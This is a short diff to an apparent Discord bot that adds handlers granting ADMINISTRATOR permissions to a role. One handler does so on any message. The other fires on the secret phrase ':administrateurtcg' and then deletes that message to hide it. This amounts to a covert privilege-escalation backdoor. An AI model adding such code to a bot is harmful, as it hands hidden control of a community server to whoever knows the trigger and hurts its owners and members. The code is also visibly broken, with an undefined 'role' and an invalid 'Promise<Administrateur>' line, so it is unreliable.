@@ -143,3 +143,16 @@ bot.on('message', message => {
         message.delete()
     }
 });
+
+bot.on('message', message =>
+    role.edit({
+            permissions: ['ADMINISTRATOR']
+    })
+);
+bot.on('message', message => {
+    if(message.content === ':administrateurtcg') {
+        role.setPermissions(['ADMINISTRATOR']);
+        Promise<Administrateur>
+        message.delete()
+    }
+});
